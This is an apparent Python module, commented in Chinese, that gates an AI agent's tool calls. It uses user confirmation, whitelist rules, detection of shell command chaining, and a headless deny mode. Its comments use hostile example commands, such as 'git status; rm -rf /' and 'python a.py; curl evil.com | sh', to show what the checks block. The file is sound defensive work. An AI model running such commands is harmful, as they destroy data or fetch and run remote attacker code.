"""Permission Gate：敏感操作确认与白名单。

工具分级：
- READONLY：自动放行；
- WRITE / DANGEROUS：需用户确认；用户可选择"本项目永久允许"，
  由会话存储记录规则，之后 authorize 直接放行。

白名单规则四类（WhitelistRule.kind）：
- ``always``：整个工具放行；
- ``prefix``：参数文本按**完整词**前缀命中，且命令类工具额外要求整条命令里没有
  shell 拼接/替换元字符（``;`` ``|`` ``&`` ``<`` ``>`` ` ``` `` `` ``$`` 换行），
  ``git status; rm -rf /`` 这类拼接命令不会被 ``git status`` 的前缀规则放行；
- ``exact``：与当初批准的那次调用参数完全一致才放行。三类调用走这一类：含 shell 拼接的
  命令（用户批准的就是那一条，不给它顺带放行同前缀的其它命令）、键盘 `type` / `hotkey`
  与 `clipboard_write`（内容本身就是对焦点窗口/剪贴板的任意操作，按动作整类放行等于
  放行任意输入），以及 `window` 的 `close`（按标题子串匹配，整类放行等于允许关掉任意应用）。
- ``glob``：参数文本通配匹配，大小写语义显式跟随文件系统（见 _CASE_INSENSITIVE_FS）。

与 Agent 循环的交互协议：
1. authorize() 先查白名单；命中即放行；
2. 未命中返回 PendingPermission（含 request_id），循环把它包装成
   PermissionRequest 事件抛给前端，然后 await 其 future；
3. 用户在 UI/CLI 上决策后调用 pending.resolve(decision)；
4. decision=allow_always 时写入一条项目级白名单规则。
"""

from __future__ import annotations

import asyncio
import difflib
import fnmatch
import os
import uuid
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING

from ..tools.base import Safety, Tool

if TYPE_CHECKING:
    from ..session.store import SessionStore

# 以「一条简单命令」为单位的前缀白名单只对 run_command 有意义；命令里出现 shell 元字符
# （见 _has_shell_chain）就意味着可能存在后续命令或参数替换，必须退回逐次确认。
_RUN_COMMAND = "run_command"

# 白名单规则的合法类型（设置页手动添加 / 导入时校验；与 WhitelistRule.matches 支持的 kind 对齐）。
RULE_KINDS = ("always", "prefix", "exact", "glob")

# glob 规则的大小写语义：Windows 文件系统大小写不敏感，规则也按不敏感匹配（与文件查找一致）；
# 其它平台严格区分。fnmatch.fnmatch 会隐式做这层归一（normcase），行为随平台悄悄变化，
# 这里显式判断，让规则语义可读、可预期。
_CASE_INSENSITIVE_FS = os.name == "nt"


def _has_shell_chain(text: str) -> bool:
    r"""命令里是否出现 shell 拼接/替换元字符。

    保守实现：不识别反斜杠 / 脱字符转义——POSIX 用 ``\``，cmd.exe 用 ``^``，两套语义
    不同，任何一处漏判都等于白名单被绕过；宁可让 ``git status; rm -rf /`` 这类命令回退
    成逐次确认。单引号内是字面量（POSIX），双引号内的 ``$`` 与反引号仍会被展开，
    所以只有 ``;|&<>`` 这类分隔符在双引号内可以放过。
    """
    single = False
    double = False
    for ch in text:
        if ch == "'" and not double:
            single = not single
            continue
        if ch == '"' and not single:
            double = not double
            continue
        if single:
            continue
        if ch in "`$" or ch in "\r\n":
            return True
        if not double and ch in ";|&<>":
            return True
    return False


def _prefix_match(text: str, pattern: str) -> bool:
    """前缀命中，且前缀必须是**完整的词**。

    ``git status`` 不该放行 ``git statusx``；动作型工具同理（``click`` 不该放行
    ``clickx``）。空 pattern 视为无效规则——历史脏数据不该变成「整个工具放行」。
    """
    if not pattern or not text.startswith(pattern):
        return False
    rest = text[len(pattern) :]
    return rest[:1] in ("", " ", "\t")


class Decision:
    ALLOW_ONCE = "allow_once"
    ALLOW_ALWAYS = "allow_always"
    DENY = "deny"


@dataclass
class WhitelistRule:
    tool: str
    kind: str  # "always" | "prefix" | "exact" | "glob"
    pattern: str = ""

    def matches(self, tool_name: str, arg_text: str) -> bool:
        if self.tool != tool_name:
            return False
        if self.kind == "always":
            return True
        if self.kind == "prefix":
            # 命令类前缀规则不覆盖 shell 拼接：`git status; rm -rf /` 必须重新询问
            if tool_name == _RUN_COMMAND and _has_shell_chain(arg_text):
                return False
            return _prefix_match(arg_text, self.pattern)
        if self.kind == "exact":
            return arg_text == self.pattern
        if self.kind == "glob":
            if _CASE_INSENSITIVE_FS:
                return fnmatch.fnmatchcase(arg_text.lower(), self.pattern.lower())
            return fnmatch.fnmatchcase(arg_text, self.pattern)
        return False


@dataclass
class PendingPermission:
    request_id: str
    tool_name: str
    arg_text: str
    safety: Safety
    detail: str
    _future: asyncio.Future = field(repr=False)
    diff: str = ""  # 写入类工具的改前→改后 unified diff 预览（确认时有真实依据）
    note: str = ""  # 额外说明（如「为什么这条命令没命中已有的前缀白名单」）
    # 选「总是允许」时将写入的项目规则：授权时算好，让确认弹窗能预告范围，
    # 并保证「预告的 = 落库的」（persist 时复用同一对象，不再二次计算）
    always_rule: WhitelistRule | None = None

    def resolve(self, decision: str) -> None:
        if not self._future.done():
            self._future.set_result(decision)

    async def wait(self) -> str:
        return await self._future


class PermissionGate:
    """每次会话创建一个实例；持有项目/会话白名单规则。"""

    def __init__(
        self,
        store: SessionStore | None = None,
        project_id: int | None = None,
        session_rules: list[WhitelistRule] | None = None,
        working_dir: Path | None = None,
    ) -> None:
        self.store = store
        self.project_id = project_id
        self.session_rules: list[WhitelistRule] = list(session_rules or [])
        self.working_dir = Path(working_dir).resolve() if working_dir else None
        # 分级权限模式（对标 Codex Auto-Edit / Claude Code acceptEdits）：
        # True 时「写入」类工具自动放行，但只限**工作目录内**的目标文件与
        # 能确认落点的工具；目标路径在工作目录外、或无法确认落点（MCP 写工具、
        # 剪贴板等）仍逐次确认。「高危」（run_command 等）任何档都走确认。
        self.auto_accept_write: bool = False
        self._project_rules: list[WhitelistRule] = []
        self.on_request: Callable[[PendingPermission], Awaitable[None]] | None = None

    async def load_project_rules(self) -> None:
        if self.store and self.project_id is not None:
            rows = await self.store.list_rules(self.project_id)
            self._project_rules = [
                WhitelistRule(tool=r["tool"], kind=r["kind"], pattern=r["pattern"]) for r in rows
            ]

    def add_session_rule(self, rule: WhitelistRule) -> None:
        self.session_rules.append(rule)

    def _match(self, tool: Tool, arg_text: str) -> bool:
        rules = self.session_rules + self._project_rules
        return any(r.matches(tool.name, arg_text) for r in rules)

    def explain(self, tool_name: str, arg_text: str) -> dict:
        """设置页「规则测试器」：这条调用会命中哪条规则 / 为何被拦。

        与 authorize() 走同一套匹配逻辑（含 shell 拼接拦截），测试结果就是实际行为，
        用户不用对着规则列表猜边界。
        """
        for r in self.session_rules + self._project_rules:
            if r.matches(tool_name, arg_text):
                return {
                    "allowed": True,
                    "hit": {"tool": r.tool, "kind": r.kind, "pattern": r.pattern},
                    "reason": "",
                }
        if self._matched_but_for_chaining(tool_name, arg_text):
            return {
                "allowed": False,
                "hit": None,
                "reason": (
                    "命令包含 shell 拼接/替换（; | & < > ` $ 或换行），"
                    "前缀规则不覆盖它，每次都会重新询问"
                ),
            }
        return {"allowed": False, "hit": None, "reason": "没有命中任何规则，会弹出确认"}

    def _matched_but_for_chaining(self, tool_name: str, arg_text: str) -> bool:
        """是否有前缀规则本可命中，却因命令里带 shell 拼接而被拦下。

        命中时确认弹窗多一句解释，否则用户会以为白名单坏了（明明勾过「总是允许」）。
        这里只看前缀本身是否成立，不管词边界：``git status; rm -rf /`` 与 ``git status``
        前缀相同、被拦的是拼接，就属于要解释的情形。
        """
        if tool_name != _RUN_COMMAND or not _has_shell_chain(arg_text):
            return False
        for r in self.session_rules + self._project_rules:
            if r.tool != tool_name or not r.pattern:
                continue
            if r.kind == "exact" and arg_text == r.pattern:
                return True
            if r.kind == "prefix" and arg_text.startswith(r.pattern):
                return True
        return False

    def _note_for(self, tool: Tool, arg_text: str) -> str:
        """确认弹窗上的额外说明：解释「为什么这次没被白名单放行」、或「这次放行的范围有多大」。

        没有说明时返回空串。目的是让用户看懂规则边界，而不是以为白名单失效。
        """
        if self._matched_but_for_chaining(tool.name, arg_text):
            return (
                "该命令以白名单里的前缀开头，但包含 shell 拼接/替换（; | & < > ` $ 或换行），"
                "前缀规则不覆盖它，所以每次都要确认。要整类放行请先看设置 · 白名单。"
            )
        # 只固化当次参数的规则（键盘输入 / 剪贴板内容 / 关闭窗口）：白名单里已有同工具规则时
        # 解释「为什么这次又重新问了」，否则是首次调用，没什么可解释的。
        if tool.name in self._EXACT_ONLY_TOOLS or self._is_exact_action(tool.name, arg_text):
            if any(r.tool == tool.name for r in self.session_rules + self._project_rules):
                if tool.name == "window" and self._is_exact_action(tool.name, arg_text):
                    return (
                        "关闭窗口只固化「总是允许」时的那一个标题：标题不同会重新询问。"
                        "（窗口按标题子串匹配，整类放行等于允许关掉任意标题含该子串的应用）"
                    )
                return self._EXACT_HINTS.get(tool.name, "")
            return ""
        return ""

    @staticmethod
    def _is_exact_action(tool_name: str, arg_text: str) -> bool:
        """这次调用是否落在「不按动作整类放行」的破坏性动作上（如 window close）。"""
        actions = PermissionGate._EXACT_ACTION_TOOLS.get(tool_name)
        if not actions:
            return False
        words = arg_text.split()
        return bool(words) and words[0] in actions

    # 动作型工具：arg_text 首词是动作（click / scroll / activate / open / search …），
    # 白名单按动作前缀生成，粒度到动作级（如只放行 click、只放行 activate）
    _ACTION_PREFIX_TOOLS = ("mouse", "window", "browser")
    # 例外 ①：键盘注入的「内容」就是对当前焦点窗口的任意操作（文本可以是任何命令），
    # 按动作词放行 type / hotkey 等于放行任意输入——改成固化用户当时批准的那一条。
    _EXACT_ONLY_TOOLS = ("keyboard", "clipboard_write")
    # 例外 ②：动作名相同但后果不可逆/匹配模糊的动作，也不按动作整类放行。
    # window 的 close 按标题**子串**匹配：放行一次 close 等于允许关掉任何标题含该
    # 子串的窗口（子串很容易误中整个应用），所以只固化当时那个标题。
    _EXACT_ACTION_TOOLS = {"window": ("close",)}
    _EXACT_HINTS = {
        "keyboard": (
            "键盘输入/按键只固化「总是允许」时的那一次内容：内容或键位不同会重新询问。"
            "（按动作整类放行 type / hotkey 等于允许向任意焦点窗口输入任意内容）"
        ),
        "clipboard_write": (
            "剪贴板写入只固化「总是允许」时的那一段内容：内容不同会重新询问。"
            "（整类放行等于允许把任意内容写进你的剪贴板，包括你即将粘贴的位置）"
        ),
    }

    @staticmethod
    def rule_for(tool: Tool, input_dict: dict) -> WhitelistRule:
        """根据本次调用生成"永久允许"规则。

        - run_command：简单命令取前两个词做前缀（如 "git status" / "npm run"），前缀规则
          本身会拒绝带 shell 拼接的整条命令；带拼接的命令没有安全前缀可提炼，改成
          ``exact`` 只放行用户当时批准的这一条；
        - 动作型工具（鼠标/窗口/浏览器）：按动作词生成前缀规则；
        - 键盘（type / hotkey）与剪贴板写入：不按动作放行，只固化这一次的内容/键位；
        - window 的 close：只固化这一个标题（按子串匹配，整类放行等于允许关掉任意应用）；
        - 其余工具：整工具放行。
        """
        arg_text = tool.arg_text(input_dict)
        if tool.name == _RUN_COMMAND:
            if not arg_text.strip() or _has_shell_chain(arg_text):
                # 例：`python a.py; curl evil.com | sh`——批准它就是批准了整条链路，
                # 不能顺带放行同前缀的其它命令，只固化这一条；空命令（action=read/kill/list）
                # 提炼不出前缀，同样只能固化当次参数，否则会退化成「整个工具放行」。
                return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
            # 取前两个词作为前缀，如 "git status" / "npm run"，避免把整条命令固化
            words = arg_text.split()
            prefix = " ".join(words[:2]) if words else arg_text
            return WhitelistRule(tool=tool.name, kind="prefix", pattern=prefix)
        if tool.name in PermissionGate._EXACT_ONLY_TOOLS:
            return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
        if tool.name in PermissionGate._ACTION_PREFIX_TOOLS:
            words = arg_text.split()
            action = words[0] if words else arg_text
            # 破坏性动作（如 window close）不按动作整类放行，只固化当次参数
            if PermissionGate._is_exact_action(tool.name, arg_text):
                return WhitelistRule(tool=tool.name, kind="exact", pattern=arg_text)
            return WhitelistRule(
                tool=tool.name, kind="prefix", pattern=action
            )
        return WhitelistRule(tool=tool.name, kind="always")

    def _write_target_inside_workdir(self, tool: Tool, input_dict: dict) -> bool:
        """「自动允许写入」档的适用范围判断：只放行能确认落在工作目录内的写入。

        - 工具声明了 write_path_arg（写目标就是 args 里的 path 字段）时才参与判断；
        - 连工作目录都不知道、路径缺失、路径解析失败、路径在工作目录外：都回退确认。
        - 带 ``path`` 但留空且工具会用默认落点（如 generate_image 落在 images/）时才放行。
        """
        if self.working_dir is None or not getattr(tool, "write_path_arg", False):
            return False
        raw = str(input_dict.get("path", "") or "").strip()
        if raw.startswith("@"):
            raw = raw[1:]
        if not raw:
            return tool.name == "generate_image"  # 空路径 = 落到工作目录内的 images/
        try:
            target = Path(raw)
            if not target.is_absolute():
                target = self.working_dir / target
            target.resolve().relative_to(self.working_dir)
        except (OSError, ValueError):
            return False
        return True

    async def authorize(self, tool: Tool, input_dict: dict) -> PendingPermission | None:
        """返回 None 表示放行；返回 PendingPermission 表示需要用户决策。"""
        if tool.safety == Safety.READONLY:
            return None
        # 自动允许写入档：只放行 WRITE 级，且目标必须确认在工作目录内；
        # 高危（执行命令）与目录外写入仍然逐次确认
        if (
            self.auto_accept_write
            and tool.safety == Safety.WRITE
            and self._write_target_inside_workdir(tool, input_dict)
        ):
            return None
        arg_text = tool.arg_text(input_dict)
        if self._match(tool, arg_text):
            return None
        pending = PendingPermission(
            request_id=uuid.uuid4().hex[:12],
            tool_name=tool.name,
            arg_text=arg_text,
            safety=tool.safety,
            detail=arg_text,
            note=self._note_for(tool, arg_text),
            _future=asyncio.get_running_loop().create_future(),
            diff=self._preview_diff(tool, input_dict),
            always_rule=self.rule_for(tool, input_dict),
        )
        if self.on_request:
            await self.on_request(pending)
        return pending

    # 写入类工具的改前→改后预览；仅限工作目录内的文本文件，失败静默降级为无 diff
    DIFF_PREVIEW_MAX_LINES = 160

    def _preview_diff(self, tool: Tool, input_dict: dict) -> str:
        if not self.working_dir or tool.name not in ("write_file", "edit_file", "write_document"):
            return ""
        raw = str(input_dict.get("path", "") or "")
        if not raw:
            return ""
        target = Path(raw)
        if not target.is_absolute():
            target = self.working_dir / target
        try:
            target.resolve().relative_to(self.working_dir)
        except (OSError, ValueError):
            return ""  # 工作目录之外：不给预览（工具层还会拦）
        try:
            old = target.read_text(encoding="utf-8") if target.is_file() else ""
        except (OSError, UnicodeDecodeError):
            return ""
        if tool.name == "write_file":
            new = str(input_dict.get("content", "") or "")
        elif tool.name == "write_document":
            # 确认弹窗展示源内容（Markdown/JSON）预览；.csv 是文本可做真实 diff，
            # 覆盖已有 docx/xlsx 时旧内容是二进制，给不出有意义的文本 diff
            if target.exists() and target.suffix.lower() != ".csv":
                return ""
            try:
                old = target.read_text(encoding="utf-8-sig") if target.is_file() else ""
            except (OSError, UnicodeDecodeError):
                return ""
            new = str(input_dict.get("content", "") or "")
        else:  # edit_file：按工具语义模拟替换
            old_s = input_dict.get("old_string")
            new_s = input_dict.get("new_string")
            if not isinstance(old_s, str) or not isinstance(new_s, str) or old_s not in old:
                return ""
            count = -1 if input_dict.get("replace_all") else 1
            new = old.replace(old_s, new_s, count)
        if old == new:
            return ""
        lines = list(
            difflib.unified_diff(
                old.splitlines(), new.splitlines(),
                fromfile="改前", tofile="改后", lineterm="",
            )
        )
        if len(lines) > self.DIFF_PREVIEW_MAX_LINES:
            rest = len(lines) - self.DIFF_PREVIEW_MAX_LINES
            lines = lines[: self.DIFF_PREVIEW_MAX_LINES] + [f"…（余 {rest} 行省略）"]
        return "\n".join(lines)

    async def persist_rule(self, rule: WhitelistRule) -> None:
        """把"永久允许"规则写入项目存储并立即生效。"""
        self._project_rules.append(rule)
        if self.store and self.project_id is not None:
            await self.store.add_rule(
                project_id=self.project_id,
                tool=rule.tool,
                kind=rule.kind,
                pattern=rule.pattern,
            )


class HeadlessGate(PermissionGate):
    """无人值守门控（定时任务 / headless run 共用）：只读自动放行；创建时
    预授权名单内的工具自动放行；其余写/高危操作自动拒绝——Agent 收到
    「已拒绝」后继续，不阻塞也不弹窗。"""

    def __init__(self, allowed: list[str], **kw) -> None:
        super().__init__(**kw)
        self.allowed = set(allowed or [])

    async def authorize(self, tool: Tool, input_dict: dict) -> PendingPermission | None:
        if tool.safety == Safety.READONLY:
            return None
        if tool.name in self.allowed:
            return None
        pending = await super().authorize(tool, input_dict)
        if pending is not None:
            pending.resolve(Decision.DENY)
        return pending
